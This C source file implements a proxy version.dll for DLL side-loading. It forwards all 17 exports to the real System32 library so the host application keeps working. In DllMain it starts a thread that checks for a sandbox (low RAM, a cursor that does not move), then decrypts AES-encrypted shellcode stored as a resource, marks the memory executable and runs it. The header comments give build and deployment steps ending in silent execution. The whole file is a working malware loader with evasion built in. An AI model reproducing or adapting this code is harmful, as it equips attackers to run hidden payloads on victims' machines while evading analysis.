/**
 * proxy.c — Proxy DLL for version.dll (DLL Side-Loading)
 *
 * This DLL impersonates version.dll by forwarding all 17 exports to the
 * real version.dll in System32 via runtime forwarding (LoadLibrary + GetProcAddress).
 * When loaded by a legitimate application, DllMain spawns a thread that
 * decrypts and executes AES-encrypted shellcode from a PE resource.
 *
 * Build (cross-compile on Kali):
 *   python3 builder.py payload.bin --proxy
 *
 * Deploy:
 *   1. Place version.dll next to a target app that loads it
 *   2. Run the target app — payload executes silently
 */

#include <windows.h>
#include "resource.h"
#include "aes.h"
#include "key.h"

// ============================================================
// Runtime Export Forwarding
//
// We load the REAL version.dll from System32 at startup, then
// each exported function calls through to the real one via
// GetProcAddress. This works with MinGW/GCC (unlike #pragma
// comment which is MSVC-only).
// ============================================================

// Handle to the real version.dll
static HMODULE hRealVersion = NULL;

// Function pointer types for all 17 exports
typedef BOOL    (WINAPI *fn_GetFileVersionInfoA)(LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL    (WINAPI *fn_GetFileVersionInfoW)(LPCWSTR, DWORD, DWORD, LPVOID);
typedef BOOL    (WINAPI *fn_GetFileVersionInfoExA)(DWORD, LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL    (WINAPI *fn_GetFileVersionInfoExW)(DWORD, LPCWSTR, DWORD, DWORD, LPVOID);
typedef DWORD   (WINAPI *fn_GetFileVersionInfoSizeA)(LPCSTR, LPDWORD);
typedef DWORD   (WINAPI *fn_GetFileVersionInfoSizeW)(LPCWSTR, LPDWORD);
typedef DWORD   (WINAPI *fn_GetFileVersionInfoSizeExA)(DWORD, LPCSTR, LPDWORD);
typedef DWORD   (WINAPI *fn_GetFileVersionInfoSizeExW)(DWORD, LPCWSTR, LPDWORD);
typedef BOOL    (WINAPI *fn_GetFileVersionInfoByHandle)(DWORD, HANDLE);
typedef DWORD   (WINAPI *fn_VerFindFileA)(DWORD, LPSTR, LPSTR, LPSTR, LPSTR, PUINT, LPSTR, PUINT);
typedef DWORD   (WINAPI *fn_VerFindFileW)(DWORD, LPWSTR, LPWSTR, LPWSTR, LPWSTR, PUINT, LPWSTR, PUINT);
typedef DWORD   (WINAPI *fn_VerInstallFileA)(DWORD, LPSTR, LPSTR, LPSTR, LPSTR, LPSTR, LPSTR, PUINT);
typedef DWORD   (WINAPI *fn_VerInstallFileW)(DWORD, LPWSTR, LPWSTR, LPWSTR, LPWSTR, LPWSTR, LPWSTR, PUINT);
typedef DWORD   (WINAPI *fn_VerLanguageNameA)(DWORD, LPSTR, DWORD);
typedef DWORD   (WINAPI *fn_VerLanguageNameW)(DWORD, LPWSTR, DWORD);
typedef BOOL    (WINAPI *fn_VerQueryValueA)(LPCVOID, LPCSTR, LPVOID*, PUINT);
typedef BOOL    (WINAPI *fn_VerQueryValueW)(LPCVOID, LPCWSTR, LPVOID*, PUINT);

// Cached function pointers (resolved on first call)
static fn_GetFileVersionInfoA         p_GetFileVersionInfoA         = NULL;
static fn_GetFileVersionInfoW         p_GetFileVersionInfoW         = NULL;
static fn_GetFileVersionInfoExA       p_GetFileVersionInfoExA       = NULL;
static fn_GetFileVersionInfoExW       p_GetFileVersionInfoExW       = NULL;
static fn_GetFileVersionInfoSizeA     p_GetFileVersionInfoSizeA     = NULL;
static fn_GetFileVersionInfoSizeW     p_GetFileVersionInfoSizeW     = NULL;
static fn_GetFileVersionInfoSizeExA   p_GetFileVersionInfoSizeExA   = NULL;
static fn_GetFileVersionInfoSizeExW   p_GetFileVersionInfoSizeExW   = NULL;
static fn_GetFileVersionInfoByHandle  p_GetFileVersionInfoByHandle  = NULL;
static fn_VerFindFileA                p_VerFindFileA                = NULL;
static fn_VerFindFileW                p_VerFindFileW                = NULL;
static fn_VerInstallFileA             p_VerInstallFileA             = NULL;
static fn_VerInstallFileW             p_VerInstallFileW             = NULL;
static fn_VerLanguageNameA            p_VerLanguageNameA            = NULL;
static fn_VerLanguageNameW            p_VerLanguageNameW            = NULL;
static fn_VerQueryValueA              p_VerQueryValueA              = NULL;
static fn_VerQueryValueW              p_VerQueryValueW              = NULL;

// Load the real version.dll and resolve all function pointers
static void load_real_version_dll() {
    // Build the full path to the real version.dll in System32
    char sys_path[MAX_PATH];
    GetSystemDirectoryA(sys_path, MAX_PATH);
    strcat(sys_path, "\\version.dll");

    hRealVersion = LoadLibraryA(sys_path);
    if (hRealVersion == NULL) return;

    p_GetFileVersionInfoA        = (fn_GetFileVersionInfoA)       GetProcAddress(hRealVersion, "GetFileVersionInfoA");
    p_GetFileVersionInfoW        = (fn_GetFileVersionInfoW)       GetProcAddress(hRealVersion, "GetFileVersionInfoW");
    p_GetFileVersionInfoExA      = (fn_GetFileVersionInfoExA)     GetProcAddress(hRealVersion, "GetFileVersionInfoExA");
    p_GetFileVersionInfoExW      = (fn_GetFileVersionInfoExW)     GetProcAddress(hRealVersion, "GetFileVersionInfoExW");
    p_GetFileVersionInfoSizeA    = (fn_GetFileVersionInfoSizeA)   GetProcAddress(hRealVersion, "GetFileVersionInfoSizeA");
    p_GetFileVersionInfoSizeW    = (fn_GetFileVersionInfoSizeW)   GetProcAddress(hRealVersion, "GetFileVersionInfoSizeW");
    p_GetFileVersionInfoSizeExA  = (fn_GetFileVersionInfoSizeExA) GetProcAddress(hRealVersion, "GetFileVersionInfoSizeExA");
    p_GetFileVersionInfoSizeExW  = (fn_GetFileVersionInfoSizeExW) GetProcAddress(hRealVersion, "GetFileVersionInfoSizeExW");
    p_GetFileVersionInfoByHandle = (fn_GetFileVersionInfoByHandle)GetProcAddress(hRealVersion, "GetFileVersionInfoByHandle");
    p_VerFindFileA               = (fn_VerFindFileA)              GetProcAddress(hRealVersion, "VerFindFileA");
    p_VerFindFileW               = (fn_VerFindFileW)              GetProcAddress(hRealVersion, "VerFindFileW");
    p_VerInstallFileA            = (fn_VerInstallFileA)           GetProcAddress(hRealVersion, "VerInstallFileA");
    p_VerInstallFileW            = (fn_VerInstallFileW)           GetProcAddress(hRealVersion, "VerInstallFileW");
    p_VerLanguageNameA           = (fn_VerLanguageNameA)          GetProcAddress(hRealVersion, "VerLanguageNameA");
    p_VerLanguageNameW           = (fn_VerLanguageNameW)          GetProcAddress(hRealVersion, "VerLanguageNameW");
    p_VerQueryValueA             = (fn_VerQueryValueA)            GetProcAddress(hRealVersion, "VerQueryValueA");
    p_VerQueryValueW             = (fn_VerQueryValueW)            GetProcAddress(hRealVersion, "VerQueryValueW");
}

// ============================================================
// Exported Wrapper Functions
//
// Each function just calls through to the real version.dll.
// The host application calls these thinking they're the real
// version.dll functions — they work identically.
// ============================================================

__declspec(dllexport) BOOL WINAPI GetFileVersionInfoA(LPCSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
    return p_GetFileVersionInfoA(lptstrFilename, dwHandle, dwLen, lpData);
}

__declspec(dllexport) BOOL WINAPI GetFileVersionInfoW(LPCWSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
    return p_GetFileVersionInfoW(lptstrFilename, dwHandle, dwLen, lpData);
}

__declspec(dllexport) BOOL WINAPI GetFileVersionInfoExA(DWORD dwFlags, LPCSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
    return p_GetFileVersionInfoExA(dwFlags, lpwstrFilename, dwHandle, dwLen, lpData);
}

__declspec(dllexport) BOOL WINAPI GetFileVersionInfoExW(DWORD dwFlags, LPCWSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData) {
    return p_GetFileVersionInfoExW(dwFlags, lpwstrFilename, dwHandle, dwLen, lpData);
}

__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeA(LPCSTR lptstrFilename, LPDWORD lpdwHandle) {
    return p_GetFileVersionInfoSizeA(lptstrFilename, lpdwHandle);
}

__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeW(LPCWSTR lptstrFilename, LPDWORD lpdwHandle) {
    return p_GetFileVersionInfoSizeW(lptstrFilename, lpdwHandle);
}

__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeExA(DWORD dwFlags, LPCSTR lpwstrFilename, LPDWORD lpdwHandle) {
    return p_GetFileVersionInfoSizeExA(dwFlags, lpwstrFilename, lpdwHandle);
}

__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeExW(DWORD dwFlags, LPCWSTR lpwstrFilename, LPDWORD lpdwHandle) {
    return p_GetFileVersionInfoSizeExW(dwFlags, lpwstrFilename, lpdwHandle);
}

__declspec(dllexport) BOOL WINAPI GetFileVersionInfoByHandle(DWORD dwFlags, HANDLE hFile) {
    return p_GetFileVersionInfoByHandle(dwFlags, hFile);
}

__declspec(dllexport) DWORD WINAPI VerFindFileA(DWORD uFlags, LPSTR szFileName, LPSTR szWinDir, LPSTR szAppDir, LPSTR szCurDir, PUINT puCurDirLen, LPSTR szDestDir, PUINT puDestDirLen) {
    return p_VerFindFileA(uFlags, szFileName, szWinDir, szAppDir, szCurDir, puCurDirLen, szDestDir, puDestDirLen);
}

__declspec(dllexport) DWORD WINAPI VerFindFileW(DWORD uFlags, LPWSTR szFileName, LPWSTR szWinDir, LPWSTR szAppDir, LPWSTR szCurDir, PUINT puCurDirLen, LPWSTR szDestDir, PUINT puDestDirLen) {
    return p_VerFindFileW(uFlags, szFileName, szWinDir, szAppDir, szCurDir, puCurDirLen, szDestDir, puDestDirLen);
}

__declspec(dllexport) DWORD WINAPI VerInstallFileA(DWORD uFlags, LPSTR szSrcFileName, LPSTR szDestFileName, LPSTR szSrcDir, LPSTR szDestDir, LPSTR szCurDir, LPSTR szTmpFile, PUINT puTmpFileLen) {
    return p_VerInstallFileA(uFlags, szSrcFileName, szDestFileName, szSrcDir, szDestDir, szCurDir, szTmpFile, puTmpFileLen);
}

__declspec(dllexport) DWORD WINAPI VerInstallFileW(DWORD uFlags, LPWSTR szSrcFileName, LPWSTR szDestFileName, LPWSTR szSrcDir, LPWSTR szDestDir, LPWSTR szCurDir, LPWSTR szTmpFile, PUINT puTmpFileLen) {
    return p_VerInstallFileW(uFlags, szSrcFileName, szDestFileName, szSrcDir, szDestDir, szCurDir, szTmpFile, puTmpFileLen);
}

__declspec(dllexport) DWORD WINAPI VerLanguageNameA(DWORD wLang, LPSTR szLang, DWORD cchLang) {
    return p_VerLanguageNameA(wLang, szLang, cchLang);
}

__declspec(dllexport) DWORD WINAPI VerLanguageNameW(DWORD wLang, LPWSTR szLang, DWORD cchLang) {
    return p_VerLanguageNameW(wLang, szLang, cchLang);
}

__declspec(dllexport) BOOL WINAPI VerQueryValueA(LPCVOID pBlock, LPCSTR lpSubBlock, LPVOID *lplpBuffer, PUINT puLen) {
    return p_VerQueryValueA(pBlock, lpSubBlock, lplpBuffer, puLen);
}

__declspec(dllexport) BOOL WINAPI VerQueryValueW(LPCVOID pBlock, LPCWSTR lpSubBlock, LPVOID *lplpBuffer, PUINT puLen) {
    return p_VerQueryValueW(pBlock, lpSubBlock, lplpBuffer, puLen);
}

// ============================================================
// Sandbox Evasion
// ============================================================
BOOL is_sandbox() {
    // Check 1: RAM < 4GB = likely a sandbox/VM
    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof(mem_status);
    GlobalMemoryStatusEx(&mem_status);
    DWORD ram_gb = (DWORD)(mem_status.ullTotalPhys / (1024 * 1024 * 1024));
    if (ram_gb < 4) {
        return TRUE;
    }

    // Check 2: cursor doesn't move = likely automated/sandbox
    POINT pos1, pos2;
    GetCursorPos(&pos1);
    Sleep(1000);
    GetCursorPos(&pos2);
    if (pos1.x == pos2.x && pos1.y == pos2.y) {
        return TRUE;
    }

    return FALSE;
}

// ============================================================
// Payload Execution — runs in a separate thread
//
// 1. Load AES-encrypted shellcode from PE resource
// 2. Decrypt with AES-256-CBC
// 3. Allocate RW memory, copy shellcode, flip to RX
// 4. Execute locally (no remote injection)
// ============================================================
DWORD WINAPI execute_payload(LPVOID lpParam) {
    // --- Sandbox evasion ---
    if (is_sandbox()) {
        return 0;
    }

    // Load encrypted payload from PE resource
    // NOTE: We use the DLL's own module handle (stored globally in DllMain)
    HMODULE hSelf = (HMODULE)lpParam;

    HRSRC res = FindResource(hSelf, MAKEINTRESOURCE(IDR_PAYLOAD), RT_RCDATA);
    if (res == NULL) {
        return 1;
    }

    HGLOBAL res_data = LoadResource(hSelf, res);
    if (res_data == NULL) {
        return 1;
    }

    LPVOID payload = LockResource(res_data);
    if (payload == NULL) {
        return 1;
    }

    DWORD payload_size = SizeofResource(hSelf, res);
    if (payload_size == 0 || payload_size % 16 != 0) {
        return 1;  // Invalid size for AES-CBC
    }

    // Allocate local buffer, copy encrypted payload, then decrypt
    LPVOID exec_buf = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_buf == NULL) {
        return 1;
    }
    RtlMoveMemory(exec_buf, payload, payload_size);

    // AES-256-CBC decryption
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, aes_key, aes_iv);
    AES_CBC_decrypt_buffer(&ctx, (uint8_t *)exec_buf, payload_size);

    // Change memory protection: RW → RX (execute-read)
    DWORD oldprotect = 0;
    if (!VirtualProtect(exec_buf, payload_size, PAGE_EXECUTE_READ, &oldprotect)) {
        VirtualFree(exec_buf, 0, MEM_RELEASE);
        return 1;
    }

    // Execute shellcode by calling the buffer as a function
    ((void(*)())exec_buf)();

    // Cleanup (only reached if shellcode returns)
    VirtualFree(exec_buf, 0, MEM_RELEASE);
    return 0;
}

// ============================================================
// DllMain — Entry point for the proxy DLL
//
// On DLL_PROCESS_ATTACH:
//   1. Load the real version.dll and resolve all function pointers
//   2. Spawn a new thread to run the payload
//
// We MUST use a thread because DllMain runs under the loader lock,
// and calling complex APIs (like our payload) directly would deadlock.
// ============================================================
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Step 1: Load real version.dll so forwarded exports work
            load_real_version_dll();

            // Step 2: Spawn payload thread
            // Pass our own module handle so the payload thread can
            // use FindResource on THIS DLL (not the host EXE)
            CreateThread(NULL, 0, execute_payload, (LPVOID)hinstDLL, 0, NULL);
            break;

        case DLL_PROCESS_DETACH:
            if (hRealVersion) {
                FreeLibrary(hRealVersion);
            }
            break;
    }
    return TRUE;
}
